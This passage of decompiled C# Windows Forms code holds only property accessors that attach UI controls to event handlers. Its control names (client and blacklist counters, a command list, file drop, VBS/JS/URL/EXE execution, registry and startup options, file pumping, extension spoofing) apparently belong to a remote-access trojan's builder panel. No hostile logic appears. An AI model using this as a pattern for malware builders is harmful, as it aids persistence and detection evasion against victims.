		[DebuggerNonUserCode]
		get
		{
			return _Comands;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Comands_SelectedIndexChanged;
			if (_Comands != null)
			{
				_Comands.remove_SelectedIndexChanged(eventHandler);
			}
			_Comands = value;
			if (_Comands != null)
			{
				_Comands.add_SelectedIndexChanged(eventHandler);
			}
		}
	}

	internal virtual ContextMenuStrip ContextMenuStrip3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ContextMenuStrip3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ContextMenuStrip3 = value;
		}
	}

	internal virtual ToolStripMenuItem RemoveCommandToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RemoveCommandToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RemoveCommandToolStripMenuItem_Click;
			if (_RemoveCommandToolStripMenuItem != null)
			{
				((ToolStripItem)_RemoveCommandToolStripMenuItem).remove_Click(eventHandler);
			}
			_RemoveCommandToolStripMenuItem = value;
			if (_RemoveCommandToolStripMenuItem != null)
			{
				((ToolStripItem)_RemoveCommandToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button AddCommand
	{
		[DebuggerNonUserCode]
		get
		{
			return _AddCommand;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = AddCommand_Click;
			if (_AddCommand != null)
			{
				((Control)_AddCommand).remove_Click(eventHandler);
			}
			_AddCommand = value;
			if (_AddCommand != null)
			{
				((Control)_AddCommand).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual ToolStripMenuItem BlockToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _BlockToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = BlockToolStripMenuItem_Click;
			if (_BlockToolStripMenuItem != null)
			{
				((ToolStripItem)_BlockToolStripMenuItem).remove_Click(eventHandler);
			}
			_BlockToolStripMenuItem = value;
			if (_BlockToolStripMenuItem != null)
			{
				((ToolStripItem)_BlockToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripSeparator ToolStripSeparator5
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripSeparator5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripSeparator5 = value;
		}
	}

	internal virtual ToolStripSeparator ToolStripSeparator6
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripSeparator6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripSeparator6 = value;
		}
	}

	internal virtual ToolStripSeparator ToolStripSeparator7
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripSeparator7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripSeparator7 = value;
		}
	}

	internal virtual TabPage TabPage11
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage11 = value;
		}
	}

	internal virtual TreeView TreeView1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TreeView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Expected O, but got Unknown
			TreeNodeMouseClickEventHandler val = new TreeNodeMouseClickEventHandler(TreeView1_NodeMouseDoubleClick);
			KeyPressEventHandler val2 = new KeyPressEventHandler(TreeView1_KeyPress);
			if (_TreeView1 != null)
			{
				_TreeView1.remove_NodeMouseDoubleClick(val);
				((Control)_TreeView1).remove_KeyPress(val2);
			}
			_TreeView1 = value;
			if (_TreeView1 != null)
			{
				_TreeView1.add_NodeMouseDoubleClick(val);
				((Control)_TreeView1).add_KeyPress(val2);
			}
		}
	}

	internal virtual Button REF
	{
		[DebuggerNonUserCode]
		get
		{
			return _REF;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = REF_Click;
			if (_REF != null)
			{
				((Control)_REF).remove_Click(eventHandler);
			}
			_REF = value;
			if (_REF != null)
			{
				((Control)_REF).add_Click(eventHandler);
			}
		}
	}

	internal virtual StatusStrip StatusStrip2
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip2 = value;
		}
	}

	internal virtual TabControl TabControl1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabControl1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabControl1 = value;
		}
	}

	internal virtual TabPage TabPage12
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage12 = value;
		}
	}

	internal virtual TabPage TabPage13
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage13 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel1 = value;
		}
	}

	internal virtual StatusStrip StatusStrip3
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip3 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel2 = value;
		}
	}

	internal virtual ToolStripStatusLabel blacklistlabel
	{
		[DebuggerNonUserCode]
		get
		{
			return _blacklistlabel;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_blacklistlabel = value;
		}
	}

	internal virtual StatusStrip StatusStrip4
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip4 = value;
		}
	}

	internal virtual ToolStripStatusLabel clientslabel
	{
		[DebuggerNonUserCode]
		get
		{
			return _clientslabel;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_clientslabel = value;
		}
	}

	internal virtual StatusStrip StatusStrip5
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip5 = value;
		}
	}

	internal virtual ToolStripStatusLabel clientsloglabel
	{
		[DebuggerNonUserCode]
		get
		{
			return _clientsloglabel;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_clientsloglabel = value;
		}
	}

	internal virtual ImageList ImageList3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList3 = value;
		}
	}

	internal virtual PictureBox PM
	{
		[DebuggerNonUserCode]
		get
		{
			return _PM;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			PaintEventHandler val = new PaintEventHandler(PM_Paint);
			if (_PM != null)
			{
				((Control)_PM).remove_Paint(val);
			}
			_PM = value;
			if (_PM != null)
			{
				((Control)_PM).add_Paint(val);
			}
		}
	}

	internal virtual Panel Panel3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel3 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Button RFM
	{
		[DebuggerNonUserCode]
		get
		{
			return _RFM;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RFM = value;
		}
	}

	internal virtual Button REFM
	{
		[DebuggerNonUserCode]
		get
		{
			return _REFM;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_REFM = value;
		}
	}

	internal virtual ToolStripMenuItem InstallInformationToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _InstallInformationToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = InstallInformationToolStripMenuItem_Click;
			if (_InstallInformationToolStripMenuItem != null)
			{
				((ToolStripItem)_InstallInformationToolStripMenuItem).remove_Click(eventHandler);
			}
			_InstallInformationToolStripMenuItem = value;
			if (_InstallInformationToolStripMenuItem != null)
			{
				((ToolStripItem)_InstallInformationToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripSeparator ToolStripSeparator8
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripSeparator8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripSeparator8 = value;
		}
	}

	internal virtual Button REFF
	{
		[DebuggerNonUserCode]
		get
		{
			return _REFF;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button4_Click;
			if (_REFF != null)
			{
				((Control)_REFF).remove_Click(eventHandler);
			}
			_REFF = value;
			if (_REFF != null)
			{
				((Control)_REFF).add_Click(eventHandler);
			}
		}
	}

	internal virtual Panel Panel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel2 = value;
		}
	}

	internal virtual GroupBox GroupBox9
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox9 = value;
		}
	}

	internal virtual GroupBox GroupBox15
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox15 = value;
		}
	}

	internal virtual Label Label29
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label29;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label29 = value;
		}
	}

	internal virtual Label Label28
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label28;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label28 = value;
		}
	}

	internal virtual Label Label7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label7 = value;
		}
	}

	internal virtual Label Label6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label6 = value;
		}
	}

	internal virtual PictureBox MSGPic
	{
		[DebuggerNonUserCode]
		get
		{
			return _MSGPic;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_MSGPic = value;
		}
	}

	internal virtual Button MSGPRI
	{
		[DebuggerNonUserCode]
		get
		{
			return _MSGPRI;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button3_Click;
			if (_MSGPRI != null)
			{
				((Control)_MSGPRI).remove_Click(eventHandler);
			}
			_MSGPRI = value;
			if (_MSGPRI != null)
			{
				((Control)_MSGPRI).add_Click(eventHandler);
			}
		}
	}

	internal virtual ComboBox MSGBUTTON
	{
		[DebuggerNonUserCode]
		get
		{
			return _MSGBUTTON;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_MSGBUTTON = value;
		}
	}

	internal virtual ComboBox MSGICON
	{
		[DebuggerNonUserCode]
		get
		{
			return _MSGICON;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = MSGICON_SelectedIndexChanged;
			if (_MSGICON != null)
			{
				_MSGICON.remove_SelectedIndexChanged(eventHandler);
			}
			_MSGICON = value;
			if (_MSGICON != null)
			{
				_MSGICON.add_SelectedIndexChanged(eventHandler);
			}
		}
	}

	internal virtual TextBox MSGB
	{
		[DebuggerNonUserCode]
		get
		{
			return _MSGB;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_MSGB = value;
		}
	}

	internal virtual TextBox MSGT
	{
		[DebuggerNonUserCode]
		get
		{
			return _MSGT;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_MSGT = value;
		}
	}

	internal virtual CheckBox CBMSG
	{
		[DebuggerNonUserCode]
		get
		{
			return _CBMSG;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CheckBox8_CheckedChanged;
			if (_CBMSG != null)
			{
				_CBMSG.remove_CheckedChanged(eventHandler);
			}
			_CBMSG = value;
			if (_CBMSG != null)
			{
				_CBMSG.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual GroupBox GroupBox10
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox10 = value;
		}
	}

	internal virtual TabControl TabControl2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabControl2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabControl2 = value;
		}
	}

	internal virtual TabPage TabPage17
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage17 = value;
		}
	}

	internal virtual CheckBox CBdrop
	{
		[DebuggerNonUserCode]
		get
		{
			return _CBdrop;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CBdrop_CheckedChanged;
			if (_CBdrop != null)
			{
				_CBdrop.remove_CheckedChanged(eventHandler);
			}
			_CBdrop = value;
			if (_CBdrop != null)
			{
				_CBdrop.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual GroupBox GroupBox11
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox11 = value;
		}
	}

	internal virtual Label Label19
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label19;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label19 = value;
		}
	}

	internal virtual ComboBox CDP
	{
		[DebuggerNonUserCode]
		get
		{
			return _CDP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CDP = value;
		}
	}

	internal virtual Label Label18
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label18 = value;
		}
	}

	internal virtual TextBox TBDN
	{
		[DebuggerNonUserCode]
		get
		{
			return _TBDN;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TBDN = value;
		}
	}

	internal virtual TabPage TabPage14
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage14 = value;
		}
	}

	internal virtual TextBox TBVBS
	{
		[DebuggerNonUserCode]
		get
		{
			return _TBVBS;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TBVBS = value;
		}
	}

	internal virtual CheckBox CBVBS
	{
		[DebuggerNonUserCode]
		get
		{
			return _CBVBS;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CBVBS_CheckedChanged;
			if (_CBVBS != null)
			{
				_CBVBS.remove_CheckedChanged(eventHandler);
			}
			_CBVBS = value;
			if (_CBVBS != null)
			{
				_CBVBS.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual TextBox TBJS
	{
		[DebuggerNonUserCode]
		get
		{
			return _TBJS;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TBJS = value;
		}
	}

	internal virtual CheckBox CBJS
	{
		[DebuggerNonUserCode]
		get
		{
			return _CBJS;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CBJS_CheckedChanged;
			if (_CBJS != null)
			{
				_CBJS.remove_CheckedChanged(eventHandler);
			}
			_CBJS = value;
			if (_CBJS != null)
			{
				_CBJS.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual TextBox TBURL
	{
		[DebuggerNonUserCode]
		get
		{
			return _TBURL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TBURL = value;
		}
	}

	internal virtual CheckBox CBURL
	{
		[DebuggerNonUserCode]
		get
		{
			return _CBURL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CBURL_CheckedChanged;
			if (_CBURL != null)
			{
				_CBURL.remove_CheckedChanged(eventHandler);
			}
			_CBURL = value;
			if (_CBURL != null)
			{
				_CBURL.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual TextBox TBSEXE
	{
		[DebuggerNonUserCode]
		get
		{
			return _TBSEXE;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TBSEXE = value;
		}
	}

	internal virtual CheckBox CBSEXE
	{
		[DebuggerNonUserCode]
		get
		{
			return _CBSEXE;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CBSEXE_CheckedChanged;
			if (_CBSEXE != null)
			{
				_CBSEXE.remove_CheckedChanged(eventHandler);
			}
			_CBSEXE = value;
			if (_CBSEXE != null)
			{
				_CBSEXE.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual TabPage TabPage15
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage15 = value;
		}
	}

	internal virtual CheckBox CBREG
	{
		[DebuggerNonUserCode]
		get
		{
			return _CBREG;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CBREG_CheckedChanged;
			if (_CBREG != null)
			{
				_CBREG.remove_CheckedChanged(eventHandler);
			}
			_CBREG = value;
			if (_CBREG != null)
			{
				_CBREG.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual GroupBox GroupBox12
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox12 = value;
		}
	}

	internal virtual TextBox TBRK
	{
		[DebuggerNonUserCode]
		get
		{
			return _TBRK;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TBRK = value;
		}
	}

	internal virtual Label Label20
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label20;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label20 = value;
		}
	}

	internal virtual Label Label21
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label21;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label21 = value;
		}
	}

	internal virtual TextBox TBRV
	{
		[DebuggerNonUserCode]
		get
		{
			return _TBRV;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TBRV = value;
		}
	}

	internal virtual TabPage TabPage16
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage16 = value;
		}
	}

	internal virtual CheckBox CBST
	{
		[DebuggerNonUserCode]
		get
		{
			return _CBST;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CBST_CheckedChanged;
			if (_CBST != null)
			{
				_CBST.remove_CheckedChanged(eventHandler);
			}
			_CBST = value;
			if (_CBST != null)
			{
				_CBST.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual GroupBox GroupBox13
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox13 = value;
		}
	}

	internal virtual Label Label25
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label25;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label25 = value;
		}
	}

	internal virtual NumericUpDown TBSTT
	{
		[DebuggerNonUserCode]
		get
		{
			return _TBSTT;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TBSTT = value;
		}
	}

	internal virtual Label Label22
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label22;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label22 = value;
		}
	}

	internal virtual Label Label23
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label23;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label23 = value;
		}
	}

	internal virtual TextBox TBSTN
	{
		[DebuggerNonUserCode]
		get
		{
			return _TBSTN;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TBSTN = value;
		}
	}

	internal virtual GroupBox GroupBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox2 = value;
		}
	}

	internal virtual Button Button7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button7_Click;
			if (_Button7 != null)
			{
				((Control)_Button7).remove_Click(eventHandler);
			}
			_Button7 = value;
			if (_Button7 != null)
			{
				((Control)_Button7).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button6_Click;
			if (_Button6 != null)
			{
				((Control)_Button6).remove_Click(eventHandler);
			}
			_Button6 = value;
			if (_Button6 != null)
			{
				((Control)_Button6).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button4_Click_2;
			if (_Button4 != null)
			{
				((Control)_Button4).remove_Click(eventHandler);
			}
			_Button4 = value;
			if (_Button4 != null)
			{
				((Control)_Button4).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button3_Click_1;
			if (_Button3 != null)
			{
				((Control)_Button3).remove_Click(eventHandler);
			}
			_Button3 = value;
			if (_Button3 != null)
			{
				((Control)_Button3).add_Click(eventHandler);
			}
		}
	}

	internal virtual GroupBox GroupBox16
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox16 = value;
		}
	}

	internal virtual ComboBox pumpcb
	{
		[DebuggerNonUserCode]
		get
		{
			return _pumpcb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_pumpcb = value;
		}
	}

	internal virtual NumericUpDown Pumpv
	{
		[DebuggerNonUserCode]
		get
		{
			return _Pumpv;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Pumpv = value;
		}
	}

	internal virtual CheckBox pumpch
	{
		[DebuggerNonUserCode]
		get
		{
			return _pumpch;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = pumpch_CheckedChanged;
			if (_pumpch != null)
			{
				_pumpch.remove_CheckedChanged(eventHandler);
			}
			_pumpch = value;
			if (_pumpch != null)
			{
				_pumpch.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual CheckBox CBPRESS
	{
		[DebuggerNonUserCode]
		get
		{
			return _CBPRESS;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CBPRESS = value;
		}
	}

	internal virtual ComboBox CSPOOFER
	{
		[DebuggerNonUserCode]
		get
		{
			return _CSPOOFER;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CSPOOFER = value;
		}
	}

	internal virtual CheckBox CBSPOOF
	{
		[DebuggerNonUserCode]
		get
		{
			return _CBSPOOF;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CBSPOOF_CheckedChanged;
			if (_CBSPOOF != null)
			{
				_CBSPOOF.remove_CheckedChanged(eventHandler);
			}
			_CBSPOOF = value;
			if (_CBSPOOF != null)
			{
				_CBSPOOF.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual GroupBox GroupBox5
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox5 = value;
		}
	}

	internal virtual RadioButton RDicon
	{
		[DebuggerNonUserCode]
		get
		{
			return _RDicon;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RDicon = value;
		}
	}

	internal virtual RadioButton RBnoicon
	{
		[DebuggerNonUserCode]
		get
		{
			return _RBnoicon;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RBnoicon_CheckedChanged;
			if (_RBnoicon != null)
			{
				_RBnoicon.remove_CheckedChanged(eventHandler);
			}
			_RBnoicon = value;
			if (_RBnoicon != null)
			{
				_RBnoicon.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual Button addicon
	{
		[DebuggerNonUserCode]
		get
		{
			return _addicon;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button4_Click_1;
